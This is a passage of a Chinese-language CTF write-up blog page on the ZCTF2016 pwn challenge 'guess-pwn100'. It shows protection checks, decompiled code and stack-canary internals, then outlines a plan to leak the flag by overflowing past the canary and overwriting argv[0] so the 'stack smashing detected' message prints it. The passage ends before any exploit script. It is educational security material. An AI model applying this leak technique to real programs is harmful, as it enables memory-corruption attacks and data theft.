@@ -1,0 +1,619 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+
+    <!--[if lt IE 9]>
+        <style>body {display: none; background: none !important} </style>
+        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
+    <![endif]-->
+
+
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<meta name="format-detection" content="telephone=no" />
+<meta name="author" content="Sp4n9x" />
+<meta name="renderer" content="webkit">
+<meta name="google" value="notranslate">
+
+
+
+<meta name="description" content="ZCTF2016 Pwn题题解&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;——当你的才华还配不上你的野心时">
+<meta name="keywords" content="CTF,Pwn">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ZCTF2016——WriteUp(Pwn)">
+<meta property="og:url" content="http://sp4n9x.github.io/2020/07/05/ZCTF2016——WriteUp(Pwn)/index.html">
+<meta property="og:site_name" content="Sp4n9x&#39;s Blog">
+<meta property="og:description" content="ZCTF2016 Pwn题题解&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;——当你的才华还配不上你的野心时">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2020-10-03T07:43:19.385Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="ZCTF2016——WriteUp(Pwn)">
+<meta name="twitter:description" content="ZCTF2016 Pwn题题解&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;&amp;emsp;——当你的才华还配不上你的野心时">
+
+<link rel="apple-touch-icon" href= "/apple-touch-icon.png">
+
+
+    <link rel="alternative" href="/atom.xml" title="Sp4n9x&#39;s Blog" type="application/atom+xml">
+
+
+
+    <link rel="shortcut icon" href="/favicon.ico">
+
+
+
+    <link href="//cdn.bootcss.com/animate.css/3.5.1/animate.min.css" rel="stylesheet">
+
+
+
+    <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">
+
+
+
+    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+
+
+<link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+
+
+<title>ZCTF2016——WriteUp(Pwn) | Sp4n9x&#39;s Blog</title>
+
+<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+
+<script>
+    var yiliaConfig = {
+        fancybox: true,
+        animate: true,
+        isHome: false,
+        isPost: true,
+        isArchive: false,
+        isTag: false,
+        isCategory: false,
+        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
+        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
+        search: true
+    }
+</script>
+
+
+    <script>
+        yiliaConfig.jquery_ui = [true, "//cdn.bootcss.com/jqueryui/1.10.4/jquery-ui.min.js", "//cdn.bootcss.com/jqueryui/1.10.4/css/jquery-ui.min.css"];
+    </script>
+
+
+
+    <script> yiliaConfig.rootUrl = "\/";</script>
+
+
+
+
+
+    <script>
+        var _hmt = _hmt || [];
+        (function() {
+            var hm = document.createElement("script");
+            hm.src = "//hm.baidu.com/hm.js?48aad015dbbeb363812643fd03e528c5";
+            var s = document.getElementsByTagName("script")[0]; 
+            s.parentNode.insertBefore(hm, s);
+        })();
+    </script>
+
+
+</head>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            <img src="/img/avatar.png" class="animated zoomIn">
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/">Sp4n9x</a></h1>
+        </hgroup>
+
+        
+
+        
+            <form id="search-form">
+            <input type="text" id="local-search-input" name="q" placeholder="search..." class="search form-control" autocomplete="off" autocorrect="off" searchonload="false" />
+            <i class="fa fa-times" onclick="resetSearch()"></i>
+            </form>
+            <div id="local-search-result"></div>
+            <p class='no-result'>No results found <i class='fa fa-spinner fa-pulse'></i></p>
+        
+
+
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                    
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        <li>友情链接</li>
+                        
+                        
+                        <li>关于我</li>
+                        
+                    </ul>
+                </div>
+            </div>
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">主页</a></li>
+                        
+                            <li><a href="/archives/">所有文章</a></li>
+                        
+                            <li><a href="/tags/">标签云</a></li>
+                        
+                            <li><a href="/about/">留言板</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" href="mailto:sp4n9x@qq.com" title="Email"></a>
+                            
+                                <a class="fa 新浪微博" href="https://weibo.com/u/5721141892" title="新浪微博"></a>
+                            
+                                <a class="fa GitHub" href="https://github.com/Sp4n9x" title="GitHub"></a>
+                            
+                                <a class="fa 知乎" href="https://www.zhihu.com/people/pangx-cn/columns" title="知乎"></a>
+                            
+                                <a class="fa 网易云音乐" href="http://music.163.com/#/user/home?id=439043183" title="网易云音乐"></a>
+                            
+                            <!--
+                            <div id="music163player">
+                                <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=250 height=86 src="//music.163.com/outchain/player?type=2&id=535693399&auto=1&height=66">
+                                </iframe>
+                            </div>
+                            -->
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Adobe-Reader/">Adobe Reader</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/DNS隐蔽信道通信/">DNS隐蔽信道通信</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/FileFormat/">FileFormat</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Got表覆写/">Got表覆写</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Kali/">Kali</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Linux/">Linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Microsoft-Office/">Microsoft Office</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Pdf/">Pdf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Pwn/">Pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ROP/">ROP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Rtf/">Rtf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SQL注入/">SQL注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Stack-Overflow/">Stack Overflow</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Ubuntu/">Ubuntu</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Windows/">Windows</a></li></ul>
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a class="main-nav-link switch-friends-link" href="//moxfive.xyz/">MOxFIVE</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+                
+                <section class="switch-part switch-part4">
+                
+                    <div id="js-aboutme">Sp4n9x&#39;s 简介</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">Sp4n9x</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                <img src="/img/avatar.png" class="animated zoomIn">
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页">Sp4n9x</a></h1>
+            </hgroup>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">主页</a></li>
+                
+                    <li><a href="/archives/">所有文章</a></li>
+                
+                    <li><a href="/tags/">标签云</a></li>
+                
+                    <li><a href="/about/">留言板</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" target="_blank" href="mailto:sp4n9x@qq.com" title="Email"></a>
+                            
+                                <a class="fa 新浪微博" target="_blank" href="https://weibo.com/u/5721141892" title="新浪微博"></a>
+                            
+                                <a class="fa GitHub" target="_blank" href="https://github.com/Sp4n9x" title="GitHub"></a>
+                            
+                                <a class="fa 知乎" target="_blank" href="https://www.zhihu.com/people/pangx-cn/columns" title="知乎"></a>
+                            
+                                <a class="fa 网易云音乐" target="_blank" href="http://music.163.com/#/user/home?id=439043183" title="网易云音乐"></a>
+                            
+                        </ul>
+            </nav>
+        </header>                
+    </div>
+</nav>
+      <div class="body-wrap"><article id="post-ZCTF2016——WriteUp(Pwn)" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2020/07/05/ZCTF2016——WriteUp(Pwn)/" class="article-date">
+      <time datetime="2020-07-04T16:00:00.000Z" itemprop="datePublished">2020-07-05</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      ZCTF2016——WriteUp(Pwn)
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+    <div class="article-category tagcloud">
+    <a class="article-category-link" href="/categories/WriteUp/">WriteUp</a>
+    </div>
+
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Pwn/">Pwn</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+      
+          
+        <blockquote>
+<p>ZCTF2016 Pwn题题解<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;——当你的才华还配不上你的野心时，请静下来好好努力！<br><a id="more"></a></p>
+</blockquote>
+<h2 id="guess-pwn100"><a href="#guess-pwn100" class="headerlink" title="guess-pwn100"></a>guess-pwn100</h2><h3 id="0x00-检查程序开启的保护机制"><a href="#0x00-检查程序开启的保护机制" class="headerlink" title="0x00 检查程序开启的保护机制"></a>0x00 检查程序开启的保护机制</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ checksec guess</span><br><span class="line">[*] &apos;/home/******/Desktop/remote-dbg/guess&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
+<p>&emsp;&emsp;我们可以看到程序开启了<code>Partial RELRO</code>(部分重定位只读)，在这种情况下，<code>.dynamic段</code>是不可写的，<code>.got.plt段</code>(GOT表)是可写的。又开启了<code>Canary</code>检测是否有<code>栈溢出</code>，开启了<code>NX(DEP)</code>使<code>堆栈</code>上的代码不可执行。</p>
+<h3 id="0x10-静态分析"><a href="#0x10-静态分析" class="headerlink" title="0x10 静态分析"></a>0x10 静态分析</h3><p>&emsp;&emsp;首先，这是一个<code>64位</code>的<code>ELF</code>可执行程序。我们使用<code>IDA</code>反汇编此文件，并用反编译插件得到<code>主函数的伪代码</code>如下：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">signed</span> __int64 __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 argc, <span class="keyword">char</span> **argv, <span class="keyword">char</span> **env)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+8h] [rbp-58h]</span></span><br><span class="line">  <span class="keyword">int</span> j; <span class="comment">// [rsp+8h] [rbp-58h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> mark; <span class="comment">// [rsp+Ch] [rbp-54h]</span></span><br><span class="line">  <span class="keyword">int</span> current_position; <span class="comment">// [rsp+10h] [rbp-50h]</span></span><br><span class="line">  FILE *stream; <span class="comment">// [rsp+18h] [rbp-48h]</span></span><br><span class="line">  <span class="keyword">char</span> input_flag[<span class="number">40</span>]; <span class="comment">// [rsp+20h] [rbp-40h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 canary; <span class="comment">// [rsp+48h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  canary = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  stream = fopen(<span class="string">"flag"</span>, <span class="string">"r"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )                                <span class="comment">// 打开失败</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);                  <span class="comment">// 关闭缓冲</span></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  alarm(<span class="number">60u</span>);</span><br><span class="line">  <span class="comment">// 设置流 stream 的文件位置为给定的偏移 offset，参数 offset 意味着从给定的 whence 位置查找的字节数。</span></span><br><span class="line">  fseek(stream, <span class="number">0L</span>L, <span class="number">2</span>);                        <span class="comment">// SEEK_END = 2</span></span><br><span class="line">  current_position = ftell(stream);             <span class="comment">// 返回给定流 stream 的当前文件位置。</span></span><br><span class="line">  fseek(stream, <span class="number">0L</span>L, <span class="number">0</span>);</span><br><span class="line">  fgets(&amp;str, current_position + <span class="number">1</span>, stream);</span><br><span class="line">  fclose(stream);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"please guess the flag:"</span>);</span><br><span class="line">  gets(input_flag);                             <span class="comment">// 输入flag,存在溢出</span></span><br><span class="line">  <span class="keyword">if</span> ( current_position != (<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="built_in">strlen</span>(input_flag) )<span class="comment">// 验证flag长度</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"len error"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">memcmp</span>(input_flag, <span class="string">"ZCTF&#123;"</span>, <span class="number">5u</span>LL) )      <span class="comment">// 验证flag开头</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"flag is start with ZCTF&#123;"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; current_position; ++i )      <span class="comment">// 输入的flag和真正的flag进行异或</span></span><br><span class="line">    *(&amp;str + i) ^= input_flag[i];</span><br><span class="line">  mark = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; current_position; ++j )      <span class="comment">// 如果输入的flag正确,则异或结果全部为0</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *(&amp;str + j) )</span><br><span class="line">    &#123;</span><br><span class="line">      mark = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( mark )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"you are right"</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"you are wrong"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>&emsp;&emsp;我们可以看出<code>整个程序的逻辑</code>是这样的。首先，<code>读取</code>当前文件夹下的<code>flag文件</code>，从这个文件中读出<code>真正的flag</code>、以及<code>flag的长度</code>。然后提示用户输入flag，程序先验证<code>用户输入的flag的长度</code>是否正确，再将<code>用户输入的flag</code>与<code>flag文件中读出的flag</code>进行<code>异或</code>，根据<code>异或的结果</code>判断<code>输入的flag</code>是否是<code>正确的flag</code>。如果<code>异或的结果</code>每一个字节都为<code>&quot;\x00&quot;</code>，则<code>输入的flag正确</code>。反之，则不正确。</p>
+<h3 id="0x20-编写exp"><a href="#0x20-编写exp" class="headerlink" title="0x20 编写exp"></a>0x20 编写exp</h3><h4 id="0x21-Stack-Smashing-Protector"><a href="#0x21-Stack-Smashing-Protector" class="headerlink" title="0x21 Stack Smashing Protector"></a>0x21 Stack Smashing Protector</h4><p>&emsp;&emsp;<code>Stack Smashing Protector</code>是一种众所周知的针对<code>基于栈的内存损坏的缓解措施</code>(例如：连续的缓冲区溢出)。也就是常说的<code>Canary</code>。</p>
+<p>&emsp;&emsp;我们可以在编译程序的时候使用<code>“–fstack-protector”</code>或<code>“–fstack-protector-all”</code>开启它，使用<code>“–fno-stack-protector”</code>关闭它。</p>
+<h4 id="0x22-开启了Stack-Smashing-Protector的程序特征"><a href="#0x22-开启了Stack-Smashing-Protector的程序特征" class="headerlink" title="0x22 开启了Stack Smashing Protector的程序特征"></a>0x22 开启了Stack Smashing Protector的程序特征</h4><p>&emsp;&emsp;开启了<code>Stack Smashing Protector</code>的程序会在<code>函数序言</code>和<code>函数尾声</code>添加一些汇编代码，如下所示：</p>
+<p><strong><code>函数序言：</code></strong><br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span><span class="number">000000000040096D</span>     <span class="keyword">push</span>    <span class="built_in">rbp</span></span><br><span class="line"><span class="symbol">.text:</span>000000000040096E     <span class="keyword">mov</span>     <span class="built_in">rbp</span>, <span class="built_in">rsp</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000400971</span>     <span class="keyword">push</span>    <span class="built_in">rbx</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000400972</span>     <span class="keyword">sub</span>     <span class="built_in">rsp</span>, <span class="number">58h</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000400976</span>     <span class="keyword">mov</span>     <span class="built_in">rax</span>, <span class="built_in">fs</span>:<span class="number">28h</span>       -|</span><br><span class="line"><span class="symbol">.text:</span>000000000040097F     <span class="keyword">mov</span>     [<span class="built_in">rbp</span>+canary], <span class="built_in">rax</span>  |向栈中写入Canary</span><br><span class="line"><span class="symbol">.text:</span><span class="number">0000000000400983</span>     <span class="keyword">xor</span>     <span class="built_in">eax</span>, <span class="built_in">eax</span>          -|</span><br></pre></td></tr></table></figure></p>
+<p><strong><code>函数尾声：</code></strong><br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span>0000000000400B6F loc_400B6F:                             </span><br><span class="line"><span class="symbol">.text:</span>0000000000400B6F     <span class="keyword">mov</span>     <span class="built_in">rbx</span>, [<span class="built_in">rbp</span>+canary]  -|</span><br><span class="line"><span class="symbol">.text:</span>0000000000400B73     <span class="keyword">xor</span>     <span class="built_in">rbx</span>, <span class="built_in">fs</span>:<span class="number">28h</span>         |验证栈中的Canary</span><br><span class="line"><span class="symbol">.text:</span>0000000000400B7C     <span class="keyword">jz</span>      short loc_400B83    |是否被修改</span><br><span class="line"><span class="symbol">.text:</span>0000000000400B7E     <span class="keyword">call</span>    ___stack_chk_fail  -|</span><br><span class="line"><span class="symbol">.text:</span>0000000000400B83 loc_400B83:                    </span><br><span class="line"><span class="symbol">.text:</span>0000000000400B83     <span class="keyword">add</span>     <span class="built_in">rsp</span>, <span class="number">58h</span></span><br><span class="line"><span class="symbol">.text:</span>0000000000400B87     <span class="keyword">pop</span>     <span class="built_in">rbx</span></span><br><span class="line"><span class="symbol">.text:</span>0000000000400B88     <span class="keyword">pop</span>     <span class="built_in">rbp</span></span><br><span class="line"><span class="symbol">.text:</span>0000000000400B89     <span class="keyword">retn</span></span><br></pre></td></tr></table></figure></p>
+<p>&emsp;&emsp;<code>fs:28h</code>中的值是<code>随机的</code>，每次程序启动都会不同，但在<code>某次程序运行过程中</code>，它是不会改变的。<code>Canary</code>在栈中的位置，一般是在<code>函数栈帧</code>的<code>ebp/rbp的上方</code>(低地址处)。当函数执行完功能后，会验证<code>栈上的Canary</code>是否被修改。如果<code>被修改</code>，会调用<code>__stack_chk_fail()</code>函数，__stack_chk_fail()函数内容如下：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">__attribute__ ((noreturn))</span><br><span class="line">__stack_chk_fail (<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">    __fortify_fail (<span class="string">"stack smashing detected"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>我们可以看到<code>__stack_chk_fail()</code>函数又调用了<code>__fortify_fail()</code>函数，其内容如下：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">__attribute__ ((noreturn))</span><br><span class="line">__fortify_fail (<span class="keyword">const</span> <span class="keyword">char</span> *msg)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* The loop is added only to keep gcc happy. */</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">        __libc_message (<span class="number">2</span>, <span class="string">"*** %s ***: %s terminated\n"</span>,</span><br><span class="line">                        msg, __libc_argv[<span class="number">0</span>] ?: <span class="string">"&lt;unknown&gt;"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">libc_hidden_def (__fortify_fail)</span><br></pre></td></tr></table></figure></p>
+<p>&emsp;&emsp;<code>msg</code>的内容为<code>“stack smashing detected”</code>，<code>__libc_argv[0]</code>的内容为<code>当前运行程序</code>的<code>名称字符串</code>。所以，如果<code>栈溢出</code>覆盖了<code>Canary</code>，则会输出以下字符串：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">**************************************</span><br><span class="line">test.c</span><br><span class="line">gcc test.c –fstack-protector -o test</span><br><span class="line">**************************************</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> str[<span class="number">10</span>];</span><br><span class="line">    gets(str);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------</span><br><span class="line">$ ./test </span><br><span class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">*** <span class="built_in">stack</span> smashing detected ***: ./test terminated</span><br><span class="line">[<span class="number">1</span>]    <span class="number">47585</span> <span class="built_in">abort</span> (core dumped)  ./test</span><br></pre></td></tr></table></figure></p>
+<h4 id="0x23-利用Stack-Smashing-Protector泄露信息"><a href="#0x23-利用Stack-Smashing-Protector泄露信息" class="headerlink" title="0x23 利用Stack Smashing Protector泄露信息"></a>0x23 利用Stack Smashing Protector泄露信息</h4><p>&emsp;&emsp;如果将<code>__libc_argv[0]</code>中的<code>字符串指针</code>覆盖为<code>要泄露的信息的地址</code>，就可以泄露出想<code>要泄露出的信息</code>。</p>
+<p><strong><code>利用思路：</code></strong></p>
+<blockquote>
+<p>1、构造<code>满足条件</code>(flag开头为ZCTF{)的<code>不同长度</code>的flag字符串，通过<code>返回信息</code>，来判断是否为<code>正确的flag的长度</code>。</p>
+<p>2、泄露出<code>正确flag的长度</code>后，构造<code>满足条件</code>(flag开头为ZCTF{)及<code>正确长度</code>的flag，并用<code>“\x00”</code>作为flag字符串的结束，绕过<code>flag长度的验证</code>。然后，继续覆盖至<code>main函数</code>的参数<code>argv[0]</code>，将其覆盖为<code>&amp;str+0x5</code>(&amp;str为存储真实flag的地址)。因为前5个字节<code>“ZCTF{”</code>相同，所以，<code>异或后的结果</code>为<code>“\x00”</code>，只能从第6字节开始泄露。</p>
